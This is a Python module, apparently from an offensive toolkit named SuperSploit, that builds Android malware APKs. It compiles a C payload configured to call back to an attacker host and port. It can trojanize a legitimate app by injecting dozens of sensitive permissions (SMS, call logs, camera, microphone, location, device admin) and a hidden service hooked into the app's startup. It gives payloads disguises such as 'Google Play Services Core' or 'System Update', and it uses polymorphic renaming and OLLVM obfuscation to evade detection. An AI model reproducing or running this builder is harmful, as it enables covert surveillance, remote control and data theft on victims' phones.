import os
import subprocess
import shutil
import xml.etree.ElementTree as ET
import zipfile
from pathlib import Path
from .database import DatabaseManagment

class NativeApkGenerator:
    """
    Generates a Native C Android APK payload.
    It compiles a C payload, injects it into a pre-compiled Java Stub (or a provided APK),
    modifies resources (LHOST, APP_NAME), packs with Apktool, and signs.
    """

    def __init__(self, output_apk_path="payloads/android/payload.apk", app_name="System Service", template_path="templates/payload/native_gen/native_drs.c", target_apk=None, exploit_path=None):
        # set c dynamic variables
        db_data = DatabaseManagment.get()
        self.lhost = db_data.get("LHOST", db_data.get("L_HOST", "127.0.0.1"))
        lport = db_data.get("LPORT", db_data.get("L_PORT", "5000"))
        self.lport = str(lport)
        self.xor_key = db_data.get("XOR_KEY", "SuperSploitKey")
        self.wakelock = str(db_data.get("WAKELOCK", "false")).lower()
        self.apk_arch = db_data.get("APK_ARCH", "all") # Default to all
        self.output_apk = os.path.abspath(output_apk_path)
        self.target_apk = target_apk
        self.exploit_path = exploit_path

        # Determine App Name
        payload_type = db_data.get("ANDROID_PAYLOAD_TYPE", "")
        if self.exploit_path:
             payload_type = "exploit"
             # Default to wrapper if not specified
             if "native_drs.c" in template_path:
                 template_path = "templates/payload/native_gen/exploit_wrapper.c"

        custom_app_name = db_data.get("APP_NAME", "")
        if custom_app_name:
            self.app_name = custom_app_name
        else:
            if payload_type == "rootkit":
                self.app_name = "SuperUser"
            elif payload_type == "messages":
                self.app_name = "Android Messages Sync"
            elif payload_type == "drs" or payload_type == "beacon":
                self.app_name = "Sky Jump"
            elif payload_type == "exploit":
                self.app_name = "System Update"
            else:
                self.app_name = "Google Play Services Core"

        self.install_root = DatabaseManagment.getInstall()
        template_filename = os.path.basename(template_path)
        self.c_template_path = os.path.join(self.install_root, "templates", "payload", "native_gen", template_filename)
        
        self.build_dir = os.path.join(self.install_root, ".data", "native_build")
        if payload_type == "messages":
            self.stub_template_dir = os.path.join(self.install_root, "templates", "payload", "native_gen", "messages_stub_template")
        elif payload_type == "rootkit" and not self.target_apk:
            self.stub_template_dir = os.path.join(self.install_root, "templates", "payload", "native_gen", "rootkit_stub_template")
        elif (payload_type == "drs" or payload_type == "beacon" or payload_type == "exploit") and not self.target_apk:
            self.stub_template_dir = os.path.join(self.install_root, "templates", "payload", "native_gen", "game_stub_template")
        else:
            self.stub_template_dir = os.path.join(self.install_root, "templates", "payload", "native_gen", "stub_template")
        self.apktool_jar = os.path.join(self.install_root, ".data", "apktool.jar")

        # --- POLYMORPHIC RANDOMIZATION ---
        self.rand_id = self._generate_random_string(6)
        self.lib_raw_name = "core" + self._generate_random_string(8)
        self.lib_name = "lib" + self.lib_raw_name
        self.jni_start_method = "v1init" + self._generate_random_string(6)
        self.jni_execute_method = "v1exec" + self._generate_random_string(6)
        self.jni_start_native_c2_method = "v1c2" + self._generate_random_string(6)
        self.jni_start_lpe_method = "v1lpe" + self._generate_random_string(6)

    def _generate_random_string(self, length=8):
        import random
        import string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate(self):
        if self.exploit_path:
            print(f"[*] Starting Native C Exploit Embedding (Exploit={os.path.basename(self.exploit_path)})...")
        else:
            print(f"[*] Starting Native C Payload Generation (LHOST={self.lhost}, LPORT={self.lport})...")
        
        if not os.path.exists(self.apktool_jar):
            print("[-] Error: apktool.jar not found in .data/. Please run setup or download it.")
            return

        try:
            self._prepare_workspace()
            self._inject_c_variables()
            self._compile_c_payload()
            self._patch_stub()
            self._build_apk()
            self._sign_apk()
        except Exception as e:
            print(f"[-] Native generation failed: {e}")
            import traceback
            traceback.print_exc()

    def _prepare_workspace(self):
        if self.target_apk and os.path.exists(self.target_apk):
            print(f"[*] Decompiling target APK: {self.target_apk}")
            if os.path.exists(self.build_dir):
                shutil.rmtree(self.build_dir)
            
            cmd = ["java", "-jar", self.apktool_jar, "d", self.target_apk, "-o", self.build_dir, "-f"]
            proc = subprocess.run(cmd, capture_output=True, text=True)
            if proc.returncode != 0:
                raise Exception(f"Failed to decompile target APK: {proc.stderr}")
        else:
            print(f"[*] Preparing native build workspace in: {self.build_dir}")
            if os.path.exists(self.build_dir):
                shutil.rmtree(self.build_dir)
            shutil.copytree(self.stub_template_dir, self.build_dir)

    def _inject_c_variables(self):
        print("[*] Injecting dynamic variables into C payload...")
        with open(self.c_template_path, 'r') as f:
            c_code = f.read()

        import re

        if self.exploit_path and os.path.exists(self.exploit_path):
            print(f"[*] Merging exploit source: {os.path.basename(self.exploit_path)}")
            with open(self.exploit_path, 'r') as f:
                exploit_src = f.read()
            
            # Remove metadata block and surrounding comment if present
            if "#!#!#!" in exploit_src:
                parts = exploit_src.split("#!#!#!")
                # Remove everything before and including the last #!#!#!
                exploit_src = parts[-1]
                # If there's a trailing */ (common if metadata was in a comment block)
                if exploit_src.strip().startswith("*/"):
                    exploit_src = exploit_src.strip()[2:]
            
            # Rename main to exploit_main to avoid conflicts
            # We look for 'int main(' or 'void main('
            exploit_src = re.sub(r'\b(int|void)\s+main\s*\(', r'\1 exploit_main(', exploit_src)
            
            c_code = c_code.replace("// {{EXPLOIT_SOURCE}}", exploit_src)

        # Support both macro replacement and Jinja-style brackets
        c_code = re.sub(r'#define LHOST .*', f'#define LHOST "{self.lhost}"', c_code)
        c_code = re.sub(r'#define LPORT .*', f'#define LPORT {self.lport}', c_code)
        c_code = re.sub(r'#define XOR_KEY .*', f'#define XOR_KEY "{self.xor_key}"', c_code)

        c_code = c_code.replace("{{LHOST}}", self.lhost)
        c_code = c_code.replace("{{LPORT}}", self.lport)
        c_code = c_code.replace("{{XOR_KEY}}", self.xor_key)

        # Apply Polymorphic JNI renaming
        print(f"[*] Applying JNI polymorphism: startNativeC2 -> {self.jni_start_native_c2_method}")
        c_code = c_code.replace("startNativeC2", self.jni_start_native_c2_method)
        c_code = c_code.replace("executeNative", self.jni_execute_method)
        c_code = c_code.replace("startLPE", self.jni_start_lpe_method)
        
        # Surgical replacement for Java_..._start to avoid mangling standard C functions or headers
        c_code = c_code.replace("PayloadService_start(", f"PayloadService_{self.jni_start_method}(")

        self.patched_c_path = os.path.join(self.build_dir, "patched_payload.c")
        with open(self.patched_c_path, 'w') as f:
            f.write(c_code)

    def _compile_for_abi(self, compiler_pattern, lib_dir):
        buildozer_root = os.path.expanduser("~/.buildozer")
        ndk_compiler = None
        if os.path.exists(buildozer_root):
            import glob
            pattern = os.path.join(buildozer_root, compiler_pattern)
            matches = glob.glob(pattern)
            if matches:
                ndk_compiler = sorted(matches, reverse=True)[0]
                
        if not ndk_compiler:
             print(f"[-] Warning: NDK compiler for pattern '{compiler_pattern}' not found in ~/.buildozer.")
             return False
            
        os.makedirs(lib_dir, exist_ok=True)
        so_path = os.path.join(lib_dir, f"{self.lib_name}.so")
        
        db_data = DatabaseManagment.get()
        ollvm_enabled = str(db_data.get("OLLVM_ENABLED", "false")).lower() == "true"

        compile_cmd = [
            ndk_compiler,
            "-shared",
            "-fPIC",
            self.patched_c_path,
            "-o",
            so_path,
            "-O2",
            "-llog"
        ]

        if ollvm_enabled:
            print("[*] OLLVM_ENABLED=true: Applying control flow flattening and instruction substitution...")
            # These are standard OLLVM flags
            compile_cmd.extend(["-mllvm", "-bcf", "-mllvm", "-sub", "-mllvm", "-fla"])
        
        proc = subprocess.run(compile_cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            print(f"[-] Compilation failed for {os.path.basename(lib_dir)}:\n{proc.stderr}")
            return False
            
        print(f"[+] Native payload compiled successfully for {os.path.basename(lib_dir)}.")
        return True

    def _compile_c_payload(self):
        print(f"[*] Cross-compiling C payload for arch: {self.apk_arch}")
        
        arch_map = {
            "arm64": ("android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android*-clang", os.path.join(self.build_dir, "lib", "arm64-v8a")),
            "armv7": ("android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/armv7a-linux-androideabi*-clang", os.path.join(self.build_dir, "lib", "armeabi-v7a")),
            "x86_64": ("android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/x86_64-linux-android*-clang", os.path.join(self.build_dir, "lib", "x86_64")),
            "x86": ("android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/i686-linux-android*-clang", os.path.join(self.build_dir, "lib", "x86")),
        }

        targets = []
        if self.apk_arch == "all":
            targets = list(arch_map.values())
        elif self.apk_arch in arch_map:
            targets.append(arch_map[self.apk_arch])
        else:
            raise ValueError(f"Unsupported APK_ARCH: {self.apk_arch}. Supported values are: {', '.join(list(arch_map.keys()) + ['all'])}")

        success_count = 0
        for pattern, lib_dir in targets:
            if self._compile_for_abi(pattern, lib_dir):
                success_count += 1
        
        if success_count == 0:
            raise Exception("Failed to compile payload for any specified architecture.")

    def _patch_stub(self):
        print("[*] Patching APK resources and configuration...")
        
        # 1. Update AndroidManifest.xml
        manifest_path = os.path.join(self.build_dir, "AndroidManifest.xml")
        with open(manifest_path, 'r') as f:
            manifest_content = f.read()
            
        import re

        # Sanitization: Fix common Apktool/Manifest errors
        # 1. Fix 'pointerIconHelp' attribute being set to 'true' (should be a resource reference)
        manifest_content = re.sub(r'\s+\w+:pointerIconHelp="true"', '', manifest_content)
        
        # 2. Fix AAPT2 'android:defaultLocale' linking error for modern Android 13+ apps
        manifest_content = re.sub(r'\s+android:localeConfig="@xml/[^"]+"', '', manifest_content)
        import glob
        for xml_file in glob.glob(os.path.join(self.build_dir, "res", "xml", "*locale_config*.xml")):
            try:
                # Overwrite with safe dummy XML instead of deleting to prevent public.xml linking errors
                with open(xml_file, 'w') as f:
                    f.write('<?xml version="1.0" encoding="utf-8"?>\n<locale-config></locale-config>')
            except Exception:
                pass

        # 3. Set targetSdkVersion in Manifest to 25 to match previously installed stubs
        manifest_content = re.sub(r'android:targetSdkVersion="\d+"', 'android:targetSdkVersion="25"', manifest_content)

        # If trojanizing, inject our service and permissions
        if self.target_apk:
            print("[*] Injecting malicious service and permissions into manifest...")
            
            # Add permissions if missing
            permissions = [
                "android.permission.INTERNET",
                "android.permission.WAKE_LOCK",
                "android.permission.READ_SMS",
                "android.permission.READ_CALL_LOG",
                "android.permission.ACCESS_NETWORK_STATE",
                "android.permission.ACCESS_WIFI_STATE",
                "android.permission.CHANGE_WIFI_STATE",
                "android.permission.CHANGE_NETWORK_STATE",
                "android.permission.ACCESS_COARSE_LOCATION",
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.ACCESS_BACKGROUND_LOCATION",
                "android.permission.READ_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.MANAGE_EXTERNAL_STORAGE",
                "android.permission.READ_CONTACTS",
                "android.permission.WRITE_CONTACTS",
                "android.permission.GET_ACCOUNTS",
                "android.permission.READ_CALENDAR",
                "android.permission.WRITE_CALENDAR",
                "android.permission.SEND_SMS",
                "android.permission.RECEIVE_SMS",
                "android.permission.RECEIVE_MMS",
                "android.permission.RECEIVE_WAP_PUSH",
                "android.permission.CAMERA",
                "android.permission.RECORD_AUDIO",
                "android.permission.MODIFY_AUDIO_SETTINGS",
                "android.permission.READ_PHONE_STATE",
                "android.permission.READ_PHONE_NUMBERS",
                "android.permission.CALL_PHONE",
                "android.permission.ANSWER_PHONE_CALLS",
                "android.permission.USE_SIP",
                "android.permission.PROCESS_OUTGOING_CALLS",
                "android.permission.BLUETOOTH",
                "android.permission.BLUETOOTH_ADMIN",
                "android.permission.BLUETOOTH_CONNECT",
                "android.permission.BLUETOOTH_SCAN",
                "android.permission.BLUETOOTH_ADVERTISE",
                "android.permission.NFC",
                "android.permission.USE_FINGERPRINT",
                "android.permission.USE_BIOMETRIC",
                "android.permission.VIBRATE",
                "android.permission.SYSTEM_ALERT_WINDOW",
                "android.permission.DISABLE_KEYGUARD",
                "android.permission.EXPAND_STATUS_BAR",
                "android.permission.GET_TASKS",
                "android.permission.REORDER_TASKS",
                "android.permission.KILL_BACKGROUND_PROCESSES",
                "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                "android.permission.REQUEST_INSTALL_PACKAGES",
                "android.permission.QUERY_ALL_PACKAGES",
                "android.permission.PACKAGE_USAGE_STATS",
                "android.permission.BIND_ACCESSIBILITY_SERVICE",
                "android.permission.BIND_DEVICE_ADMIN",
                "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
                "android.permission.WRITE_SETTINGS",
                "android.permission.WRITE_SECURE_SETTINGS",
                "android.permission.READ_LOGS",
                "android.permission.DUMP",
                "android.permission.BATTERY_STATS",
                "android.permission.CAPTURE_AUDIO_OUTPUT",
                "android.permission.CAPTURE_SECURE_VIDEO_OUTPUT",
                "android.permission.CAPTURE_VIDEO_OUTPUT",
                "android.permission.CLEAR_APP_CACHE",
                "android.permission.DELETE_PACKAGES",
                "android.permission.DIAGNOSTIC",
                "android.permission.FACTORY_TEST",
                "android.permission.FORCE_BACK",
                "android.permission.INJECT_EVENTS",
                "android.permission.INSTALL_PACKAGES",
                "android.permission.MANAGE_DOCUMENTS",
                "android.permission.READ_FRAME_BUFFER",
                "android.permission.REBOOT",
                "android.permission.SET_TIME",
                "android.permission.SET_TIME_ZONE",
                "android.permission.UPDATE_DEVICE_STATS",
                "android.permission.USE_CREDENTIALS"
            ]
            for perm in permissions:
                if f'android:name="{perm}"' not in manifest_content:
                    manifest_content = manifest_content.replace("<application", f"<uses-permission android:name=\"{perm}\"/>\n    <application", 1)
            
            # Add service declaration
            service_tag = '<service android:name="org.supersploit.stub.PayloadService" android:exported="true"/>'
            if "org.supersploit.stub.PayloadService" not in manifest_content:
                if "</application>" in manifest_content:
                    manifest_content = manifest_content.replace("</application>", f"    {service_tag}\n    </application>")
                else:
                    # Fallback if no </application> tag (rare)
                    manifest_content = manifest_content.replace("</manifest>", f"    <application>\n        {service_tag}\n    </application>\n</manifest>")
            
            # Identify Hook Point (Application or Main Activity)
            hook_target = None
            
            # Priority 1: Application Class
            app_match = re.search(r'<application [^>]*android:name="([^"]+)"', manifest_content)
            if app_match:
                hook_target = app_match.group(1)
                print(f"[+] Identified Application class for hooking: {hook_target}")
                if self._hook_class(hook_target, is_application=True):
                    hook_target = "hooked" # Success

            # Priority 2: Main Activity (Launcher)
            if hook_target != "hooked":
                activity_matches = re.finditer(r'<activity ([^>]+)>(.*?)</activity>', manifest_content, re.DOTALL)
                for match in activity_matches:
                    attrs = match.group(1)
                    body = match.group(2)
                    if "android.intent.action.MAIN" in body and "android.intent.category.LAUNCHER" in body:
                        name_match = re.search(r'android:name="([^"]+)"', attrs)
                        if name_match:
                            hook_target = name_match.group(1)
                            print(f"[+] Identified Main Activity (Launcher) for hooking: {hook_target}")
                            if self._hook_class(hook_target):
                                hook_target = "hooked"
                                break

            # Priority 3: Any Main Activity
            if hook_target != "hooked":
                activity_matches = re.finditer(r'<activity ([^>]+)>(.*?)</activity>', manifest_content, re.DOTALL)
                for match in activity_matches:
                    attrs = match.group(1)
                    body = match.group(2)
                    if "android.intent.action.MAIN" in body:
                        name_match = re.search(r'android:name="([^"]+)"', attrs)
                        if name_match:
                            hook_target = name_match.group(1)
                            print(f"[+] Identified Main Activity for hooking: {hook_target}")
                            if self._hook_class(hook_target):
                                hook_target = "hooked"
                                break
            
            if hook_target != "hooked":
                print("[-] Warning: Could not identify suitable entry point for hooking. Payload may not start automatically.")

            # Copy malicious smali files
            self._inject_malicious_smali()

        else:
            # Standalone mode: just update the app name
            manifest_content = re.sub(
                r'android:label="[^"]*"', 
                f'android:label="{self.app_name}"', 
                manifest_content
            )
        
        with open(manifest_path, 'w') as f:
            f.write(manifest_content)

        # Apply Polymorphic Patching to Smali (Pro Feature)
        from .license_manager import LicenseManager
        if LicenseManager.check_pro_status():
            self._polymorphic_patch_smali()
        else:
            print("[*] Skipping Polymorphic Rotation (SuperSploit Pro feature).")

        # 1.5 Set targetSdkVersion in apktool.yml to 25
        apktool_yml_path = os.path.join(self.build_dir, "apktool.yml")
        if os.path.exists(apktool_yml_path):
            with open(apktool_yml_path, 'r') as f:
                yml_content = f.read()
            yml_content = re.sub(r"targetSdkVersion:\s*'?\d+'?", "targetSdkVersion: '25'", yml_content)
            with open(apktool_yml_path, 'w') as f:
                f.write(yml_content)

        # 2. Update strings.xml (LHOST, LPORT, XOR_KEY, WAKELOCK)
        strings_path = os.path.join(self.build_dir, "res", "values", "strings.xml")
        if not os.path.exists(strings_path):
            os.makedirs(os.path.dirname(strings_path), exist_ok=True)
            with open(strings_path, "w") as f:
                f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources></resources>')

        tree = ET.parse(strings_path)
        root = tree.getroot()
        
        config_vars = {
            "lhost": self.lhost,
            "lport": self.lport,
            "xor_key": self.xor_key,
            "wakelock": self.wakelock
        }
        
        # Update existing or add new
        existing_names = [e.get('name') for e in root.findall('string')]
        for name, val in config_vars.items():
            if name in existing_names:
                for string_elem in root.findall('string'):
                    if string_elem.get('name') == name:
                        string_elem.text = val
            else:
                elem = ET.SubElement(root, 'string', name=name)
                elem.text = val
            
        tree.write(strings_path, encoding='utf-8', xml_declaration=True)
        print("[+] APK configuration patched.")

    def _inject_malicious_smali(self):
        print("[*] Injecting malicious Smali files...")
        smali_src = os.path.join(self.stub_template_dir, "smali", "org", "supersploit", "stub")
        
        SMART_inject = False
        highest_dex = 1
        
        for folder in os.listdir(self.build_dir):
            if folder == "smali":
                highest_dex = max(highest_dex, 1)
            elif folder.startswith("smali_classes"):
                try:
                    num = int(folder.replace("smali_classes", ""))
                    highest_dex = max(highest_dex, num)
                    SMART_inject = True  # Target already uses multidex, it's a massive APK!
                except ValueError:
                    pass

        if SMART_inject:
            print("[*] SMART_inject triggered: Massive APK detected. Isolating payload to bypass 64K limit...")
            smali_target_base = os.path.join(self.build_dir, f"smali_classes{highest_dex + 1}")
            os.makedirs(smali_target_base, exist_ok=True)
            print(f"[+] Payload safely isolated in {os.path.basename(smali_target_base)}")
        else:
            smali_target_base = os.path.join(self.build_dir, "smali")
            if not os.path.exists(smali_target_base):
                os.makedirs(smali_target_base)

        smali_target = os.path.join(smali_target_base, "org", "supersploit", "stub")
        if os.path.exists(smali_target):
            shutil.rmtree(smali_target)
        
        shutil.copytree(smali_src, smali_target)

    def _polymorphic_patch_smali(self):
        """Randomizes JNI method names and library name in Smali files."""
        print("[*] Performing polymorphic patching on Smali files...")
        import glob
        smali_files = glob.glob(os.path.join(self.build_dir, "smali*", "**", "*.smali"), recursive=True)
        
        for smali_file in smali_files:
            with open(smali_file, 'r') as f:
                content = f.read()
            
            original_content = content
            
            # Replace JNI method names
            content = content.replace("executeNative", self.jni_execute_method)
            content = content.replace("startNativeC2", self.jni_start_native_c2_method)
            content = content.replace("startLPE", self.jni_start_lpe_method)
            
            # Handle 'start' method surgicaly - only native start(Landroid/content/Context;)V
            # This prevents breaking Thread.start() or Context.startService()
            content = content.replace("native start(Landroid/content/Context;)V", f"native {self.jni_start_method}(Landroid/content/Context;)V")
            content = content.replace("->start(Landroid/content/Context;)V", f"->{self.jni_start_method}(Landroid/content/Context;)V")
            
            # Some older templates might use simple start()V as native
            content = content.replace("native start()V", f"native {self.jni_start_method}()V")
            # We ONLY replace ->start()V if it's on our known classes to be safe
            content = content.replace(f"Lorg/supersploit/stub/PayloadService;->start()V", f"Lorg/supersploit/stub/PayloadService;->{self.jni_start_method}()V")

            # Replace library name in System.loadLibrary
            content = content.replace('const-string v0, "payload"', f'const-string v0, "{self.lib_raw_name}"')
            content = content.replace('const-string v1, "payload"', f'const-string v1, "{self.lib_raw_name}"')

            if content != original_content:
                with open(smali_file, 'w') as f:
                    f.write(content)

    def _hook_class(self, class_name, is_application=False):
        """Injects service start hook into onCreate of specified class."""
        # Convert class name (e.g. com.example.App) to path
        rel_path = class_name.replace(".", os.sep) + ".smali"
        
        # Search across all smali folders
        found_path = None
        import glob
        for smali_dir in glob.glob(os.path.join(self.build_dir, "smali*")):
            test_path = os.path.join(smali_dir, rel_path)
            if os.path.exists(test_path):
                found_path = test_path
                break
        
        if not found_path:
            # Try handling relative names (e.g. .MainActivity)
            if class_name.startswith("."):
                package_name = self._get_package_name()
                full_name = package_name + class_name
                return self._hook_class(full_name, is_application)
            return False

        print(f"[*] Attempting to hook into Smali: {found_path}")
        with open(found_path, 'r') as f:
            smali_lines = f.readlines()

        import re
        new_smali = []
        method_signature = "onCreate()V" if is_application else "onCreate(Landroid/os/Bundle;)V"
        method_found = False
        hook_injected = False
        
        for line in smali_lines:
            new_smali.append(line)
            
            if method_signature in line:
                method_found = True
                continue
                
            if method_found and not hook_injected:
                if ".locals" in line:
                    match = re.search(r'\.locals (\d+)', line)
                    if match:
                        num_locals = int(match.group(1))
                        # We need at least 3 local registers (v0, v1, v2) to safely execute the hook
                        # without exceeding the 4-bit register limits of invoke-direct (v0-v15).
                        if num_locals < 3:
                            new_locals = 3
                        else:
                            new_locals = num_locals
                            
                        new_smali[-1] = f"    .locals {new_locals}\n"
                        
                        hook_code = [
                            f"\n    # SuperSploit Hook\n",
                            f"    move-object/from16 v2, p0\n",
                            f"    new-instance v0, Landroid/content/Intent;\n",
                            f"    const-class v1, Lorg/supersploit/stub/PayloadService;\n",
                            f"    invoke-direct {{v0, v2, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n",
                            f"    invoke-virtual {{v2, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n",
                            f"    const/4 v0, 0x0\n",
                            f"    const/4 v1, 0x0\n",
                            f"    const/4 v2, 0x0\n"
                        ]
                        new_smali.extend(hook_code)
                        hook_injected = True
                        method_found = False # Done with this method

        if hook_injected:
            with open(found_path, 'w') as f:
                f.writelines(new_smali)
            print(f"[+] Successfully hooked {class_name}")
            return True
        else:
            print(f"[-] Failed to inject hook into {class_name} ({method_signature} not found)")
            return False

    def _get_package_name(self):
        manifest_path = os.path.join(self.build_dir, "AndroidManifest.xml")
        with open(manifest_path, 'r') as f:
            content = f.read()
        import re
        match = re.search(r'package="([^"]+)"', content)
        return match.group(1) if match else ""

    def _build_apk(self):
        print("[*] Repacking APK via Apktool (This will be very fast)...")
        self.unsigned_apk = os.path.join(self.install_root, ".data", "unsigned_payload.apk")
        self.aligned_apk = os.path.join(self.install_root, ".data", "aligned_payload.apk")

        cmd = ["java", "-jar", self.apktool_jar, "b", self.build_dir, "-o", self.unsigned_apk, "--use-aapt2"]
        proc = subprocess.run(cmd, capture_output=True, text=True)
        
        if proc.returncode != 0 or not os.path.exists(self.unsigned_apk):
            raise Exception(f"Apktool build failed:\n{proc.stderr}\n{proc.stdout}")
            
        print("[*] Enforcing uncompressed resources.arsc and .so libraries...")
        temp_apk = self.unsigned_apk + ".tmp"
        with zipfile.ZipFile(self.unsigned_apk, 'r') as zin, \
             zipfile.ZipFile(temp_apk, 'w') as zout:
            for item in zin.infolist():
                buffer = zin.read(item.filename)
                info = zipfile.ZipInfo(item.filename, date_time=item.date_time)
                info.external_attr = item.external_attr

                if item.filename == 'resources.arsc' or item.filename.endswith('.so'):
                    info.compress_type = zipfile.ZIP_STORED
                else:
                    info.compress_type = item.compress_type

                zout.writestr(info, buffer)

        shutil.move(temp_apk, self.unsigned_apk)

        print("[*] Aligning APK (4-byte boundaries)...")
        align_cmd = ["zipalign", "-p", "-f", "4", self.unsigned_apk, self.aligned_apk]
        align_proc = subprocess.run(align_cmd, capture_output=True, text=True)
        if align_proc.returncode != 0:
            raise Exception(f"Zipalign failed:\n{align_proc.stderr}\n{align_proc.stdout}")

    def _sign_apk(self):
        print("[*] Signing APK with debug keystore...")
        keystore = os.path.join(self.install_root, ".data", "debug.keystore")
        
        # Generate keystore if missing
        if not os.path.exists(keystore):
            print("[*] Generating one-time debug keystore...")
            subprocess.run([
                "keytool", "-genkey", "-v", "-keystore", keystore, 
                "-alias", "androiddebugkey", "-storepass", "android", 
                "-keypass", "android", "-keyalg", "RSA", "-keysize", "2048", 
                "-validity", "10000", "-dname", "CN=Android Debug,O=Android,C=US"
            ], capture_output=True)
            
        # Find apksigner
        buildozer_root = os.path.expanduser("~/.buildozer")
        apksigner = None
        if os.path.exists(buildozer_root):
            import glob
            matches = glob.glob(os.path.join(buildozer_root, "android/platform/android-sdk/build-tools/*/apksigner"))
            if matches:
                apksigner = sorted(matches, reverse=True)[0]
                
        if not apksigner:
            raise Exception("apksigner not found in ~/.buildozer.")
            
        sign_cmd = [
            apksigner, "sign", "--ks", keystore, "--ks-pass", "pass:android", 
            "--out", self.output_apk, self.aligned_apk
        ]
        
        proc = subprocess.run(sign_cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            raise Exception(f"Signing failed:\n{proc.stderr}")
            
        print(f"[+] Success! Native Payload generated and signed in ~2 seconds.")
        print(f"[*] Saved to: {self.output_apk}")
        
        # Cleanup temp apks
        if os.path.exists(self.unsigned_apk):
            os.remove(self.unsigned_apk)
        if hasattr(self, 'aligned_apk') and os.path.exists(self.aligned_apk):
            os.remove(self.aligned_apk)
